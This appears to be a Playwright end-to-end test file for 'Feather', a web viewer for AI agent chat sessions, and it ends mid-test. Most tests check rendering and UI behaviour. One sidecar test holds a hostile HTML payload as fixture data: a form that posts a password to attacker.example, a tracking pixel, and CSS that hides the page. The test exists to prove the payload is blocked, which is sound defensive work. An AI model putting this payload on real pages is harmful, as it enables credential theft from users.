// @ts-check
import { test, expect } from '@playwright/test'
import fs from 'fs'
import path from 'path'

const BASE = process.env.FEATHER_URL || 'http://localhost:4870'
const HOME = process.env.HOME || '/home/user'
const CLAUDE_PROJECTS = path.join(HOME, '.claude/projects')

// ── Synthetic session setup ─────────────────────────────────────────────────

const TEST_SESSION_ID = `e2e-feather-${Date.now()}`
const HTML_ARTIFACT_PATH = path.join('/tmp', `${TEST_SESSION_ID}-artifact.html`)
const TEXT_ARTIFACT_PATH = path.join('/tmp', `${TEST_SESSION_ID}-fixture.js`)
let testSessionPath

function writeLine(obj) {
  fs.appendFileSync(testSessionPath, JSON.stringify(obj) + '\n')
}

test.beforeAll(() => {
  const dirs = fs.readdirSync(CLAUDE_PROJECTS).filter(d =>
    fs.statSync(path.join(CLAUDE_PROJECTS, d)).isDirectory()
  )
  if (dirs.length === 0) throw new Error('No project dirs in ~/.claude/projects/')

  testSessionPath = path.join(CLAUDE_PROJECTS, dirs[0], `${TEST_SESSION_ID}.jsonl`)
  fs.writeFileSync(HTML_ARTIFACT_PATH, '<!doctype html><html><head><title>Feather artifact</title></head><body><h1>Rendered HTML artifact</h1><p>This is rendered markup, not source text.</p></body></html>')
  fs.writeFileSync(TEXT_ARTIFACT_PATH, '// Synthetic session setup\nexport const fixture = true\n')

  writeLine({
    type: 'user', uuid: 'e2e-msg-001', timestamp: '2025-06-15T14:00:00Z',
    isSidechain: false, isMeta: false,
    message: { role: 'user', content: 'Explain how **markdown** rendering works in `Feather`' },
  })
  writeLine({
    type: 'assistant', uuid: 'e2e-msg-002', timestamp: '2025-06-15T14:00:05Z',
    isSidechain: false, isMeta: false,
    message: {
      role: 'assistant',
      content: [
        { type: 'thinking', thinking: '**Planning** the markdown pipeline.' },
        { type: 'text', text: `Feather uses **marked** with GFM support.\n\n## How it works\n\n1. Raw text goes through \`marked.parse()\`\n2. Output is sanitized with \`DOMPurify\`\n3. Result is cached in an LRU map\n\n\`\`\`js\nconst html = marked.parse(text)\nconst safe = DOMPurify.sanitize(html)\n\`\`\`\n\nThis keeps things **fast** and **secure**.\n\nInline math: $2 \\times 4 = 8$.\n\n$$\n\\sum_{i=1}^{n} i = \\frac{n(n+1)}{2}\n$$\n\nBacktick math: \`$x^2$\`.\n\nFenced backtick math:\n\n\`\`\`\n$$\n\\int_0^1 x^2\,dx = \\frac{1}{3}\n$$\n\`\`\`\n\nOrdinary code stays literal: \`const formula = "$x^2$"\`.\n\nIt costs $5 and another item costs $10.\n\nLocal artifact: [Feather fixture](${TEXT_ARTIFACT_PATH}:12)\n\nHTML artifact: [Rendered artifact](${HTML_ARTIFACT_PATH})` },
      ],
    },
  })
  writeLine({
    type: 'assistant', uuid: 'e2e-msg-003', timestamp: '2025-06-15T14:00:10Z',
    isSidechain: false, isMeta: false,
    message: {
      role: 'assistant',
      content: [
        { type: 'tool_use', id: 'tool_e2e', name: 'Read', input: { file_path: '/src/MessageView.tsx' } },
        { type: 'tool_use', id: 'tool_err', name: 'Read', input: { file_path: '/missing.txt' } },
      ],
    },
  })
  writeLine({
    type: 'assistant', uuid: 'e2e-msg-004', timestamp: '2025-06-15T14:00:12Z',
    isSidechain: false, isMeta: false,
    message: {
      role: 'assistant',
      content: [{ type: 'tool_result', tool_use_id: 'tool_e2e', content: 'export function MessageView() { ... }', is_error: false }],
    },
  })
  writeLine({
    type: 'assistant', uuid: 'e2e-msg-005', timestamp: '2025-06-15T14:00:15Z',
    isSidechain: false, isMeta: false,
    message: {
      role: 'assistant',
      content: [{ type: 'tool_result', tool_use_id: 'tool_err', content: 'ENOENT: no such file', is_error: true }],
    },
  })
  writeLine({
    type: 'assistant', uuid: 'e2e-msg-005a', timestamp: '2025-06-15T14:00:20Z',
    isSidechain: false, isMeta: false,
    message: {
      role: 'assistant',
      content: [
        { type: 'text', text: 'I found the mismatch and am checking one last source.' },
        { type: 'tool_use', id: 'tool_mixed', name: 'Read', input: { file_path: '/src/final-check.ts' } },
      ],
    },
  })
  writeLine({
    type: 'assistant', uuid: 'e2e-msg-005b', timestamp: '2025-06-15T14:00:22Z',
    isSidechain: false, isMeta: false,
    message: {
      role: 'assistant',
      content: [{ type: 'tool_result', tool_use_id: 'tool_mixed', content: 'export const verified = true', is_error: false }],
    },
  })
  writeLine({
    type: 'assistant', uuid: 'e2e-msg-005c', timestamp: '2025-06-15T14:00:25Z',
    isSidechain: false, isMeta: false,
    message: { role: 'assistant', content: [{ type: 'text', text: 'The implementation is now verified.' }] },
  })
  writeLine({
    type: 'user', uuid: 'e2e-msg-006', timestamp: '2025-06-15T14:01:00Z',
    isSidechain: false, isMeta: false,
    message: { role: 'user', content: 'Thanks, that makes sense!' },
  })
  writeLine({
    type: 'assistant', uuid: 'e2e-msg-007', timestamp: '2025-06-15T14:01:05Z',
    isSidechain: false, isMeta: false,
    message: {
      role: 'assistant',
      content: [{ type: 'text', text: `[Open local session file](${testSessionPath})` }],
    },
  })
})

test.afterAll(() => {
  try { fs.unlinkSync(testSessionPath) } catch {}
  try { fs.unlinkSync(HTML_ARTIFACT_PATH) } catch {}
  try { fs.unlinkSync(TEXT_ARTIFACT_PATH) } catch {}
})

// ── Helpers ─────────────────────────────────────────────────────────────────

async function openSidebar(page) {
  await page.locator('button:has-text("☰")').click()
  await page.waitForTimeout(300)
}

async function selectTestSession(page) {
  await openSidebar(page)
  const sessionItem = page.locator(`[data-session-id="${TEST_SESSION_ID}"]`)
  await expect(sessionItem).toBeVisible({ timeout: 5000 })
  await sessionItem.click()
  await page.waitForTimeout(500)
}

// Send button uses an SVG polygon, no text. Find it by the polygon shape.
function sendButton(page) {
  return page.locator('button:has(svg polygon)')
}

// ── App shell ───────────────────────────────────────────────────────────────

test.describe('App shell', () => {
  test('shows empty state when no session selected', async ({ page }) => {
    await page.goto(BASE)
    await expect(page.getByText('Feather', { exact: true }).last()).toBeVisible({ timeout: 10000 })
    // No tabs should be visible
    await expect(page.locator('button:has-text("Chat")')).not.toBeVisible()
    await expect(page.locator('button:has-text("Terminal")')).not.toBeVisible()
  })

  test('hamburger exposes every chat harness without a nested menu', async ({ page }) => {
    await page.goto(BASE)
    await page.waitForLoadState('networkidle')
    await openSidebar(page)
    await expect(page.getByText('Feather', { exact: true }).first()).toBeVisible()
    await expect(page.locator('button:has-text("+ New OMP")')).toBeVisible()
    await expect(page.getByRole('button', { name: '+ Claude Code' }).last()).toBeVisible()
    await expect(page.getByRole('button', { name: '+ Codex' }).last()).toBeVisible()
    await expect(page.getByText('Other', { exact: true })).not.toBeVisible()
    await expect(page.getByText(/^Keep working: #/)).toHaveCount(0)
  })

  test('sidebar closes with Escape key', async ({ page }) => {
    await page.goto(BASE)
    await page.waitForLoadState('networkidle')
    // Hamburger should be visible initially
    await expect(page.locator('button:has-text("☰")')).toBeVisible()
    await openSidebar(page)
    // Hamburger hides when sidebar is open
    await expect(page.locator('button:has-text("☰")')).not.toBeVisible()
    await page.keyboard.press('Escape')
    await page.waitForTimeout(300)
    // Hamburger should re-appear after sidebar closes
    await expect(page.locator('button:has-text("☰")')).toBeVisible()
  })

  test('sidebar shows our test session', async ({ page }) => {
    await page.goto(BASE)
    await page.waitForLoadState('networkidle')
    await openSidebar(page)
    await expect(page.locator(`text=Explain how`).first()).toBeVisible({ timeout: 5000 })
  })
})

// ── Session selection ───────────────────────────────────────────────────────

test.describe('Session selection', () => {
  test('selecting a session shows chat and terminal tabs', async ({ page }) => {
    await page.goto(BASE)
    await page.waitForLoadState('networkidle')
    await selectTestSession(page)
    await expect(page.locator('button:has-text("Chat")')).toBeVisible()
    await expect(page.locator('button:has-text("Terminal")')).toBeVisible()
  })

  test('selecting a session hides the empty state', async ({ page }) => {
    await page.goto(BASE)
    await page.waitForLoadState('networkidle')
    await selectTestSession(page)
    // Chat/Terminal tabs should now be visible (empty state is gone)
    await expect(page.locator('button:has-text("Chat")')).toBeVisible()
  })

  test('header shows session title after selection', async ({ page }) => {
    await page.goto(BASE)
    await page.waitForLoadState('networkidle')
    await selectTestSession(page)
    // The header should no longer show the placeholder
    await expect(page.getByText('Select a session', { exact: true })).not.toBeVisible()
  })

  test('SSE stream is established when session is selected', async ({ page }) => {
    await page.goto(BASE)
    await page.waitForLoadState('networkidle')

    const ssePromise = page.waitForRequest(req =>
      req.url().includes('/api/sessions/') && req.url().includes('/stream')
    )
    await selectTestSession(page)
    const sseReq = await ssePromise
    expect(sseReq.url()).toContain('/stream')
  })
})

test('sidebar searches recent all-harness titles with latest-query-wins', async ({ page }) => {
  const olderTitle = 'Older Claude title result'
  const currentOmpTitle = 'Current OMP title result'
  let apiSearchCalls = 0
  let olderRequests = 0
  /** @type {() => void} */
  let releaseOlder
  const olderGate = new Promise(resolve => { releaseOlder = resolve })

  await page.route('**/api/search**', route => {
    apiSearchCalls++
    return route.fulfill({ json: { results: [] } })
  })
  await page.route('**/api/sessions**', async route => {
    const url = new URL(route.request().url())
    if (url.pathname !== '/api/sessions' || route.request().method() !== 'GET') return route.continue()
    const query = url.searchParams.get('q')
    if (query === 'older') {
      olderRequests++
      await olderGate
      return route.fulfill({ json: { sessions: [{
        id: 'older-title-result', title: olderTitle, updatedAt: '2026-08-29T12:00:00Z',
        isActive: false, agent: 'claude',
      }] } })
    }
    if (query === 'current') {
      return route.fulfill({ json: { sessions: [{
        id: 'current-omp-title-result', title: currentOmpTitle, updatedAt: '2026-08-30T12:00:00Z',
        isActive: true, agent: 'omp',
      }] } })
    }
    return route.fulfill({ json: { sessions: [] } })
  })

  await page.goto(BASE)
  await openSidebar(page)
  await page.getByTitle('Search recent chat titles').click()
  const input = page.getByRole('textbox', { name: 'Search recent chat titles' })
  await expect(input).toHaveAttribute('placeholder', 'Search recent chat titles...')

  await input.fill('older')
  await expect.poll(() => olderRequests).toBe(1)
  await input.fill('current')
  await expect(page.getByText(currentOmpTitle, { exact: true })).toBeVisible()
  await expect(page.getByText('OMP', { exact: true })).toBeVisible()

  releaseOlder()
  await page.waitForTimeout(100)
  await expect(page.getByText(olderTitle, { exact: true })).toHaveCount(0)
  await page.getByText(currentOmpTitle, { exact: true }).click()
  await expect(page).toHaveURL(/#current-omp-title-result$/)
  expect(apiSearchCalls).toBe(0)
})

test('deep-linked exact metadata survives an omitted bounded refresh', async ({ page }) => {
  const id = 'older-deep-linked-chat'
  const exact = {
    id,
    title: 'Exact archived Codex chat',
    updatedAt: '2026-08-28T12:00:00Z',
    isActive: false,
    agent: 'codex',
    cwd: '/srv/archive/exact-chat',
  }
  let exactRequests = 0
  let boundedRequests = 0
  let resumedCwd = null
  /** @type {() => void} */
  let releaseSecondExact
  const secondExactGate = new Promise(resolve => { releaseSecondExact = resolve })

  await page.route('**/api/sessions**', async route => {
    const url = new URL(route.request().url())
    if (url.pathname !== '/api/sessions' || route.request().method() !== 'GET') return route.continue()
    if (url.searchParams.get('q') === id) {
      exactRequests++
      if (exactRequests === 2) await secondExactGate
      return route.fulfill({ json: { sessions: [exact] } })
    }
    boundedRequests++
    return route.fulfill({ json: { sessions: [] } })
  })
  await page.route(`**/api/sessions/${id}/messages*`, route => route.fulfill({
    json: { messages: [], hasMore: false },
  }))
  await page.route(`**/api/sessions/${id}/protocol-runs`, route => route.fulfill({ json: { runs: [] } }))
  await page.route(`**/api/sessions/${id}/resume`, route => {
    resumedCwd = JSON.parse(route.request().postData() || '{}').cwd
    return route.fulfill({ json: { ok: true } })
  })

  await page.goto(`${BASE}/#${id}`)
  const header = page.getByTestId('session-header')
  await expect(header).toContainText(exact.title)
  await expect(header).toContainText(exact.cwd)
  await expect(header).toHaveAttribute('data-session-id', id)
  await expect(header).toHaveAttribute('data-agent', 'codex')

  await page.locator('button').filter({ hasText: '⋮' }).click()
  await page.getByRole('button', { name: 'Resume', exact: true }).click()
  await expect.poll(() => boundedRequests).toBeGreaterThanOrEqual(2)
  await expect.poll(() => exactRequests).toBe(2)
  expect(resumedCwd).toBe(exact.cwd)

  await expect(header).toContainText(exact.title)
  await expect(header).toContainText(exact.cwd)
  await expect(header).toHaveAttribute('data-agent', 'codex')
  await expect(header).not.toContainText('New session')

  releaseSecondExact()
  await expect(page.getByRole('status')).toContainText('Chat resumed.')
  await expect(header).toContainText(exact.title)
  await expect(header).toContainText(exact.cwd)
})

// ── Message rendering ───────────────────────────────────────────────────────

test.describe('Message rendering', () => {
  test.beforeEach(async ({ page }) => {
    // Use the exact deep link. A synthetic transcript can be older than the
    // bounded sidebar snapshot on a busy host, but exact resume must still work.
    await page.goto(`${BASE}/#${TEST_SESSION_ID}`)
    await expect(page.locator('.markdown').first()).toBeVisible({ timeout: 10000 })
  })

  test('user message renders as right-aligned bubble', async ({ page }) => {
    // User messages should have flex-end alignment
    const userBubbles = page.locator('div[style*="flex-end"]')
    await expect(userBubbles.first()).toBeVisible()
  })

  test('assistant message renders as left-aligned bubble', async ({ page }) => {
    const assistantBubbles = page.locator('div[style*="flex-start"]')
    await expect(assistantBubbles.first()).toBeVisible()
  })

  test('markdown bold renders as <strong>', async ({ page }) => {
    // The assistant message contains **marked** and **fast** and **secure**
    const strongElements = page.locator('.markdown strong')
    const count = await strongElements.count()
    expect(count).toBeGreaterThanOrEqual(1)
    // Check specific text
    const allText = await page.locator('.markdown').allInnerTexts()
    const combined = allText.join(' ')
    expect(combined).toContain('marked')
    expect(combined).toContain('fast')
    expect(combined).toContain('secure')
  })

  test('markdown inline code renders as <code>', async ({ page }) => {
    const codeElements = page.locator('.markdown code')
    const count = await codeElements.count()
    expect(count).toBeGreaterThanOrEqual(1)
  })

  test('LaTeX renders bare and math-only backtick containers without changing ordinary code or currency', async ({ page }) => {
    const answer = page.locator('.markdown').filter({ hasText: 'Feather uses marked with GFM support.' })
    await expect(answer.locator('.katex')).toHaveCount(4)
    await expect(answer.locator('.katex').first()).toBeVisible()
    await expect(answer.locator('.katex-display')).toHaveCount(2)
    await expect(answer.locator('code').filter({ hasText: 'const formula = \"$x^2$\"' })).toBeVisible()
    await expect(answer.getByText('It costs $5 and another item costs $10.')).toBeVisible()
    await page.screenshot({ path: '/tmp/feather-math-backticks.png', fullPage: false })
  })

  test('markdown heading renders as <h2>', async ({ page }) => {
    const h2 = page.locator('.markdown h2')
    await expect(h2.first()).toBeVisible()
    const text = await h2.first().innerText()
    expect(text).toContain('How it works')
  })

  test('markdown ordered list renders as <ol>', async ({ page }) => {
    const ol = page.locator('.markdown ol')
    await expect(ol.first()).toBeVisible()
    const items = page.locator('.markdown ol li')
    const count = await items.count()
    expect(count).toBe(3)
  })

  test('markdown code block renders as <pre><code>', async ({ page }) => {
    const pre = page.locator('.markdown pre')
    await expect(pre.first()).toBeVisible()
    const code = await pre.first().innerText()
    expect(code).toContain('marked.parse')
    expect(code).toContain('DOMPurify.sanitize')
  })

  test('code blocks wrap by default and persist the per-block toggle', async ({ page }) => {
    const pre = page.locator('.markdown pre').first()
    const shell = pre.locator('xpath=ancestor::div[contains(@class,"code-block-shell")]')
    const code = pre.locator('code')
    const toolbar = shell.locator('.code-tools')
    const toggle = toolbar.getByLabel('Wrap long code and output lines')

    await expect(toolbar).toBeVisible()
    const toolbarBox = await toolbar.boundingBox()
    const preBox = await pre.boundingBox()
    expect(toolbarBox).not.toBeNull()
    expect(preBox).not.toBeNull()
    expect(toolbarBox.y + toolbarBox.height).toBeLessThanOrEqual(preBox.y + 1)
    await expect(toggle).toBeChecked()
    expect(await code.evaluate(el => getComputedStyle(el).whiteSpace)).toBe('pre-wrap')

    await toggle.uncheck()
    expect(await code.evaluate(el => getComputedStyle(el).whiteSpace)).toBe('pre')
    expect(await page.evaluate(() => localStorage.getItem('feather-code-wrap'))).toBe('false')

    await page.reload()
    await expect(page.locator('.markdown').first()).toBeVisible({ timeout: 5000 })
    await expect(toolbar).toBeVisible()
    await expect(toggle).not.toBeChecked()
    expect(await code.evaluate(el => getComputedStyle(el).whiteSpace)).toBe('pre')

    await toggle.check()
  })

  test('markdown links to local artifacts use the Files preview endpoint', async ({ page }) => {
    const link = page.getByRole('link', { name: 'Feather fixture' })
    const expectedPath = TEXT_ARTIFACT_PATH
    const expectedHref = `/api/files/raw?path=${encodeURIComponent(expectedPath)}`
    await expect(link).toHaveAttribute('href', expectedHref)

    await link.click()
    await expect(page.getByText(path.basename(TEXT_ARTIFACT_PATH), { exact: true })).toBeVisible()
    await expect(page.getByText('// Synthetic session setup', { exact: false })).toBeVisible()
    await page.getByTitle('Close').click()
  })

  test('markdown links to HTML artifacts open as rendered sandboxed pages', async ({ page }) => {
    const link = page.getByRole('link', { name: 'Rendered artifact' })
    const expectedHref = `/api/files/html?path=${encodeURIComponent(HTML_ARTIFACT_PATH)}`
    await expect(link).toHaveAttribute('href', expectedHref)

    await link.click()
    const preview = page.locator(`iframe[title="${path.basename(HTML_ARTIFACT_PATH)}"]`)
    await expect(preview).toBeVisible()
    await expect(preview.contentFrame().getByRole('heading', { name: 'Rendered HTML artifact' })).toBeVisible()
    await expect(preview.contentFrame().locator('body')).not.toContainText('<h1>')
    await page.getByTitle('Close').click()
  })

  test('reasoning stays in nested collapsible Activity beside a direct answer', async ({ page }) => {
    const bubble = page.locator('[data-role="assistant"]').filter({ hasText: /Feather uses .*marked.* with GFM support/ }).first()
    await expect(bubble).toBeVisible()
    const activity = bubble.locator('details.work-log')
    await expect(activity).toHaveJSProperty('open', false)
    await activity.getByTestId('work-log-summary').click()
    const reasoning = activity.locator('details').filter({ hasText: 'Reasoning' }).last()
    await expect(reasoning).toBeVisible()
    await expect(reasoning).toHaveJSProperty('open', false)
    await reasoning.locator('summary').click()
    await expect(reasoning).toContainText('Planning')
  })

  test('assistant text beside a tool call stays exposed outside Activity', async ({ page }) => {
    const progress = page.getByText('I found the mismatch and am checking one last source.', { exact: true })
    await expect(progress).toBeVisible()
    const activityRow = page.locator('[data-role="assistant"]').filter({ has: progress })
    await expect(activityRow.getByTestId('work-log-summary')).toContainText('Activity')
    await expect(page.locator('[data-role="assistant"]').filter({ hasText: 'The implementation is now verified.' })).toBeVisible()
  })

  test('an open Activity panel stays open while later execution updates arrive', async ({ page }) => {
    const workLog = page.locator('details.work-log').first()
    await workLog.getByTestId('work-log-summary').click()
    await expect(workLog).toHaveJSProperty('open', true)

    const updateUuid = 'e2e-activity-later-update'
    if (!fs.readFileSync(testSessionPath, 'utf8').includes(updateUuid)) {
      writeLine({
        type: 'assistant', uuid: updateUuid, timestamp: new Date().toISOString(),
        isSidechain: false, isMeta: false,
        message: { role: 'assistant', content: [{ type: 'tool_use', id: 'tool_later', name: 'Read', input: { file_path: '/src/later.ts' } }] },
      })
    }

    await expect(workLog).toHaveJSProperty('open', true)
  })

  test('Activity precedes a tool-using final answer in chronological turn order', async ({ page }) => {
    const chronological = await page.locator('[data-role="assistant"]').evaluateAll(rows => {
      const activity = rows.find(row =>
        row.textContent?.includes('I found the mismatch and am checking one last source.') &&
        row.querySelector('.work-log'))
      const answer = rows.find(row => row.textContent?.includes('The implementation is now verified.'))
      return !!(activity && answer && activity !== answer &&
        (activity.compareDocumentPosition(answer) & Node.DOCUMENT_POSITION_FOLLOWING))
    })
    expect(chronological).toBe(true)
  })

  test('tool_use block is preserved inside Activity', async ({ page }) => {
    const activityRow = page.locator('[data-role="assistant"]').filter({ hasText: 'I found the mismatch and am checking one last source.' })
    const workLog = activityRow.locator('details.work-log')
    await workLog.getByTestId('work-log-summary').click()
    await expect(activityRow.getByText('Read').first()).toBeVisible()
  })

  test('tool_result output is revealed from Activity and the tool call', async ({ page }) => {
    const activityRow = page.locator('[data-role="assistant"]').filter({ hasText: 'I found the mismatch and am checking one last source.' })
    const workLog = activityRow.locator('details.work-log')
    await workLog.getByTestId('work-log-summary').click()
    const result = activityRow.locator('summary:has-text("output")')
    await expect(result.first()).toBeVisible()
  })

  test('failed work is flagged quietly and its error remains reachable inside Activity', async ({ page }) => {
    const activityRow = page.locator('[data-role="assistant"]').filter({ hasText: 'I found the mismatch and am checking one last source.' })
    const workLog = activityRow.locator('details.work-log')
    const activitySummary = workLog.getByTestId('work-log-summary')
    await expect(activitySummary).toContainText('Activity')
    await expect(activitySummary).toContainText('1 issue')
    await activitySummary.click()
    const summary = activityRow.locator('summary', { hasText: 'missing.txt' })
    await expect(summary).toBeVisible()
    await summary.click()
    const error = activityRow.locator('summary:has-text("error")')
    await expect(error.first()).toBeVisible()
  })

  test('timestamps are displayed on messages', async ({ page }) => {
    // Timestamps are small text under each bubble
    const allText = await page.locator('span').allInnerTexts()
    const timePattern = /\d{1,2}:\d{2}/
    const timestamps = allText.filter(t => timePattern.test(t))
    expect(timestamps.length).toBeGreaterThanOrEqual(4)
  })
})

// ── Chat input ──────────────────────────────────────────────────────────────

test.describe('Chat input', () => {
  test.beforeEach(async ({ page }) => {
    await page.goto(`${BASE}/#${TEST_SESSION_ID}`)
    await expect(page.locator('.markdown').first()).toBeVisible({ timeout: 10000 })
  })

  test('chat input is visible on chat tab', async ({ page }) => {
    const textarea = page.locator('textarea[placeholder="Send a message..."]')
    await expect(textarea).toBeVisible()
  })

  test('chat input is hidden on terminal tab', async ({ page }) => {
    await page.locator('button:has-text("Terminal")').click()
    await page.waitForTimeout(300)
    const textarea = page.locator('textarea[placeholder="Send a message..."]')
    await expect(textarea).not.toBeVisible()
  })

  test('send button is dim when input is empty', async ({ page }) => {
    const btn = sendButton(page)
    const bg = await btn.evaluate(el => getComputedStyle(el).backgroundColor)
    // Should be gray-ish (not green)
    expect(bg).not.toContain('74, 186, 106')
  })

  test('send button changes style when text is entered', async ({ page }) => {
    const textarea = page.locator('textarea[placeholder="Send a message..."]')
    const btn = sendButton(page)

    const bgEmpty = await btn.evaluate(el => getComputedStyle(el).backgroundColor)

    await textarea.fill('test')
    await page.waitForTimeout(100)

    const bgFilled = await btn.evaluate(el => getComputedStyle(el).backgroundColor)
    expect(bgFilled).not.toEqual(bgEmpty)
  })

  test('textarea auto-grows with multi-line input', async ({ page }) => {
    const textarea = page.locator('textarea[placeholder="Send a message..."]')
    const initialHeight = await textarea.evaluate(el => el.offsetHeight)

    await textarea.fill('Line 1\nLine 2\nLine 3\nLine 4\nLine 5')
    await textarea.dispatchEvent('input')
    await page.waitForTimeout(200)

    const newHeight = await textarea.evaluate(el => el.offsetHeight)
    expect(newHeight).toBeGreaterThan(initialHeight)
  })

  test('input clears after sending', async ({ page }) => {
    const textarea = page.locator('textarea[placeholder="Send a message..."]')
    await textarea.fill('test message to clear')
    await page.waitForTimeout(100)

    await sendButton(page).click()
    await page.waitForTimeout(300)

    const value = await textarea.inputValue()
    expect(value).toBe('')
  })

  test('Enter key sends, Shift+Enter adds newline', async ({ page }) => {
    const textarea = page.locator('textarea[placeholder="Send a message..."]')

    // Shift+Enter should not send
    await textarea.fill('line 1')
    await textarea.press('Shift+Enter')
    await page.waitForTimeout(100)
    const val = await textarea.inputValue()
    expect(val.length).toBeGreaterThan(0)

    // Enter should send and clear
    await textarea.fill('will be sent')
    await textarea.press('Enter')
    await page.waitForTimeout(300)
    const afterSend = await textarea.inputValue()
    expect(afterSend).toBe('')
    await expect(textarea).toBeFocused()
  })

  test('active transcript updates preserve the focused draft', async ({ page }) => {
    const textarea = page.locator('textarea[placeholder="Send a message..."]')
    await textarea.fill('Keep this Films6 thought intact')
    await textarea.focus()
    writeLine({
      type: 'assistant',
      uuid: `composer-stream-${Date.now()}`,
      timestamp: new Date().toISOString(),
      isSidechain: false,
      isMeta: false,
      message: { role: 'assistant', content: [{ type: 'text', text: 'A background Films6 update arrived.' }] },
    })

    await expect(page.getByText('A background Films6 update arrived.', { exact: true })).toBeVisible()
    await expect(textarea).toBeFocused()
    await expect(textarea).toHaveValue('Keep this Films6 thought intact')
  })

  test('pasting an image keeps focus and accompanying text', async ({ page }) => {
    const textarea = page.locator('textarea[placeholder="Send a message..."]')
    await textarea.focus()
    await textarea.evaluate(element => {
      const file = new File(['pixels'], 'films6-frame.png', { type: 'image/png' })
      const clipboard = {
        items: [{ kind: 'file', type: 'image/png', getAsFile: () => file }],
        getData: type => type === 'text/plain' ? 'Look at this frame' : '',
      }
      const event = new Event('paste', { bubbles: true, cancelable: true })
      Object.defineProperty(event, 'clipboardData', { value: clipboard })
      element.dispatchEvent(event)
    })

    await expect(textarea).toBeFocused()
    await expect(textarea).toHaveValue('Look at this frame')
  })

  test('ArrowUp never replaces a nonempty draft with history', async ({ page }) => {
    const textarea = page.locator('textarea[placeholder="Send a message..."]')
    await textarea.fill('Do not replace this draft')
    await textarea.evaluate(element => element.setSelectionRange(0, 0))
    await textarea.press('ArrowUp')
    await expect(textarea).toHaveValue('Do not replace this draft')
  })
})

// ── Tab switching ───────────────────────────────────────────────────────────

test.describe('Tab switching', () => {
  test.beforeEach(async ({ page }) => {
    // Open by hash so these tab regressions also cover resuming a direct link
    // and do not depend on the server's intentionally stale session-list cache.
    await page.goto(`${BASE}/#${TEST_SESSION_ID}`)
    await expect(page.locator('p').filter({ hasText: 'Thanks, that makes sense!' }).first()).toBeVisible({ timeout: 10000 })
  })

  test('chat tab is active by default', async ({ page }) => {
    const chatTab = page.locator('button:has-text("Chat")')
    const borderBottom = await chatTab.evaluate(el => {
      const cs = getComputedStyle(el)
      return cs.borderBottomColor
    })
    expect(borderBottom).not.toBe('rgba(0, 0, 0, 0)')
    expect(borderBottom).not.toBe('transparent')
  })

  test('clicking terminal tab hides chat content', async ({ page }) => {
    await page.locator('button:has-text("Terminal")').click()
    await page.waitForTimeout(500)

    const textarea = page.locator('textarea[placeholder="Send a message..."]')
    await expect(textarea).not.toBeVisible()
  })

  test('switching back to chat shows messages again', async ({ page }) => {
    await page.locator('button:has-text("Terminal")').click()
    await page.waitForTimeout(300)

    await page.locator('button:has-text("Chat")').click()
    await page.waitForTimeout(300)

    await expect(page.locator('.markdown').first()).toBeVisible()
  })

  test('prompts tab shows only user asks and hides the composer', async ({ page }) => {
    await page.getByRole('button', { name: 'Prompts', exact: true }).click()
    const panel = page.getByTestId('prompts-panel')
    await expect(panel).toBeVisible()
    await expect(panel).toContainText('Explain how **markdown** rendering works in `Feather`')
    await expect(panel).toContainText('Thanks, that makes sense!')
    await expect(panel).not.toContainText('Feather uses marked')
    await expect(page.locator('textarea[placeholder="Send a message..."]')).not.toBeVisible()
  })

  test('Wiki explains chats that are not assigned to a Room', async ({ page }) => {
    await page.route(`**/api/sessions/${TEST_SESSION_ID}/room`, route => route.fulfill({ json: { room: null } }))
    await page.getByRole('button', { name: 'Wiki', exact: true }).click()
    const panel = page.getByTestId('wiki-panel')
    await expect(panel).toBeVisible()
    await expect(panel).toContainText('This chat is not in a Room')
    await expect(page.locator('textarea[placeholder="Send a message..."]')).not.toBeVisible()
  })
})

test('Wiki loads the selected chat Room caretaker synthesis', async ({ page }) => {
  await page.route(`**/api/sessions/${TEST_SESSION_ID}/room`, route => route.fulfill({ json: { room: 'e2e-room' } }))
  await page.route('**/api/rooms/e2e-room/wiki', route => route.fulfill({ json: {
    pages: [{ name: 'Home', size: 80, updatedAt: '2025-06-15T14:03:00Z' }],
  } }))
  await page.route('**/api/rooms/e2e-room/wiki/page**', route => route.fulfill({ json: {
    name: 'Home',
    content: '# E2E Room\n\nCaretaker synthesis is visible here.',
    updatedAt: '2025-06-15T14:03:00Z',
  } }))
  await page.goto(`${BASE}/#${TEST_SESSION_ID}`)
  await expect(page.locator('p').filter({ hasText: 'Thanks, that makes sense!' }).first()).toBeVisible({ timeout: 10000 })
  await page.getByRole('button', { name: 'Wiki', exact: true }).click()

  const panel = page.getByTestId('wiki-panel')
  await expect(panel).toContainText('Caretaker synthesis is visible here.')
  await expect(panel.getByRole('button', { name: 'Updates', exact: true })).toHaveCount(0)
})

test('Room Sidecar A2A stays internal to the canonical Leader chat', async ({ page }) => {
  const a2a = [
    { seq: 1, ts: Date.parse('2026-08-30T12:00:00Z'), from: 'leader', to: 'caretaker', text: 'Check the Wiki decision.' },
    { seq: 3, ts: Date.parse('2026-08-30T12:00:02Z'), from: 'caretaker', to: 'leader', text: '<style>body{display:none}</style><form action="https://attacker.example/steal"><input name="password"></form>![pixel](https://attacker.example/pixel)' },
    { seq: 2, ts: Date.parse('2026-08-30T12:00:01Z'), from: 'caretaker', to: 'leader', text: 'Decision is current.' },
  ]
  let remoteMediaRequests = 0
  await page.route('https://attacker.example/**', async route => {
    remoteMediaRequests++
    await route.abort()
  })
  await page.route(`**/api/sessions/${TEST_SESSION_ID}/room`, route => route.fulfill({
    json: { room: 'feather', kind: 'main', role: 'leader', label: 'Main' },
  }))
  await page.route('**/api/sidecar/room-feather/stream', route => route.fulfill({
    status: 200,
    contentType: 'text/event-stream',
    body: `event: connected\ndata: {}\n\n${a2a.map(message => `event: message\ndata: ${JSON.stringify(message)}\n\n`).join('')}`,
  }))
  await page.route('**/api/sidecar/room-feather', route => route.fulfill({ json: {
    group: {
      id: 'room-feather', kind: 'room', roomName: 'feather', status: 'active',
      members: [
        { sessionId: TEST_SESSION_ID, role: 'leader', spawned: false },
        { sessionId: 'caretaker-session', role: 'caretaker', spawned: false },
      ],
    },
    thread: a2a,
  } }))

  await page.goto(`${BASE}/#${TEST_SESSION_ID}`)
  await expect(page.getByText('Check the Wiki decision.')).toHaveCount(0)
  await expect(page.getByText('Decision is current.')).toHaveCount(0)
  await expect(page.getByText(/\[feather-sidecar room-feather/)).toHaveCount(0)
  await expect(page.getByTestId('chat-panel').locator('form, input[name="password"], img[src*="attacker.example"]')).toHaveCount(0)
  expect(remoteMediaRequests).toBe(0)
})

// ── Live SSE updates in the browser ─────────────────────────────────────────

test.describe('Live updates', () => {
  test('new message appears in real-time via SSE', async ({ page }) => {
    const streamRequest = page.waitForRequest(request => request.url().includes(`/api/sessions/${TEST_SESSION_ID}/stream`))
